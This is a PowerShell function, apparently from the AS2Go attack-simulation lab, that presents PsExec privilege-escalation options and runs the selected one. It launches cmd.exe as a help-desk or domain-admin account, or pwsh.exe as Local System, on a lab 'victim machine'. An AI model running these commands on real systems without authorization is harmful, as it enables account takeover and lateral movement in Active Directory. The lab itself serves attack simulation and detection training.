<#
.SYNOPSIS
Presents PsExec command options for privilege escalation in the AS2Go lab.

.DESCRIPTION
Displays PsExec command choices for Local System, Help Desk, or Domain Admin execution on the
victim machine. The user can select a command to run or skip the workflow, then choose whether
to repeat the selection.

.FUNCTIONALITY
This attack abuses the fact that the Local System account has extensive privileges on the Active Directory. 
By using PsExec, an attacker can execute a command prompt with Local System privileges, 
which can be used to further escalate privileges or perform malicious activities on the environment.

.COMPONENT
Category: Main Function
#>
function Invoke-PrivilegesEscalationViaLocalSystem {

    ################################################################################
    #####                                                                      ##### 
    #####    Start a process as a different user on the victim machine         #####                                
    #####                                                                      #####
    ################################################################################

    $CurrentFunction = Get-FunctionName
    Write-Log -Message "### Start Function $CurrentFunction ###"
    $StartRunTime = (Get-Date).ToString($Script:DateFormatLog)
    #################### main code | out- host ####################

    Update-WindowTitle -NewTitle "PsExec Attack"
    Set-ASConfig -Setting "LastStage" -Value "PsExec Attack"

    Do {

        $domain = $env:USERDOMAIN

        If (-not $SkipClearHost) { Clear-Host }

        Invoke-Output -Type Header -Message "Select your preferred PSExec Command"
        Invoke-Output -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)


        Write-Host "`nEnter " -NoNewline 
        Write-Host "H " -NoNewline -ForegroundColor Yellow
        Write-Host "to run: " -NoNewline
        Write-Highlight -Text (".\PSExec.exe ", "-u ", "$domain\$Global:ASHelpDeskUser ", "-d -h -i ", "cmd.exe") -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV

        Write-Host "Enter " -NoNewline 
        Write-Host "D " -NoNewline -ForegroundColor Yellow
        Write-Host "to run: " -NoNewline
        Write-Highlight -Text (".\PSExec.exe ", "-u ", "$domain\$Global:ASDomainAdmin ", "-d -h -i ", "cmd.exe") -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV

        Write-Host "Enter " -NoNewline 
        Write-Host "L " -NoNewline -ForegroundColor Yellow
        Write-Host "to run: " -NoNewline
        Write-Highlight -Text (".\PSExec.exe ", "-d -s -i ", "pwsh.exe") -Color $fgcC, $fgcS, $fgcV


        $title = "Privilege Escalation"
        $message = "Select the attack technique to execute."
        $Options = @(
            [pscustomobject] @{
                Label = "&Local System"
                Help  = "Run a PsExec attack to execute a command prompt with Local System privileges."
                Value = "LocalSystem"
            },
            [pscustomobject] @{
                Label = "&HelpDeskUser"
                Help  = "Run a PsExec attack to execute a command prompt with Help Desk User privileges."
                Value = "HelpDeskUser"
            },
            [pscustomobject] @{
                Label = "&Domain Admin"
                Help  = "Run a PsExec attack to execute a command prompt with Domain Admin privileges."
                Value = "DomainAdmin"
            },
            [pscustomobject] @{
                Label = "&Skip"
                Help  = "Skip Privilege Escalation."
                Value = "S"
            }
        )
        $answer = Show-DecisionPrompt -Message $message -Options $Options -Default 0 -Title $title
                
        write-host "`n"
        If ($answer -eq "HelpDeskUser") {
            Write-Highlight -Text (".\PSExec.exe ", "-u ", "$domain\$Global:ASHelpDeskUser ", "-d -h -i ", "cmd.exe") -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV
            Invoke-Command -ScriptBlock { & "$($Script:ASTools)\PsExec.exe" -u $domain\$Global:ASHelpDeskUser -d -h -i cmd.exe -nobanner } #| Out-Host

        }
        elseif ($answer -eq "LocalSystem") {
            Write-Highlight -Text (".\PSExec.exe ", "-d -s -i ", "pwsh.exe") -Color $fgcC, $fgcS, $fgcV
            Invoke-Command -ScriptBlock { & "$($Script:ASTools)\PsExec.exe" -d -s -i pwsh.exe -nobanner } #| Out-Host

        }
        elseif ($answer -eq "DomainAdmin") {
            Write-Highlight -Text (".\PSExec.exe ", "-u ", "$domain\$Global:ASDomainAdmin ", "-d -h -i ", "cmd.exe") -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV
            Invoke-Command -ScriptBlock { & "$($Script:ASTools)\PsExec.exe" -u $domain\$Global:ASDomainAdmin -d -h -i cmd.exe -nobanner } #| Out-Host

        }
        else {
            return
        }

        $title = "REPEAT | PSExec Command"
        $repeat = Show-DecisionPrompt -Default 1 -Title $title

    } Until ($repeat -eq $Script:No)

    ######################## main code ############################
    $runtime = Get-RunTime -StartRunTime $StartRunTime
    Write-Log -Message "    Run Time: $runtime [h] ###"
    Write-Log -Message "### End Function $CurrentFunction ###"
}
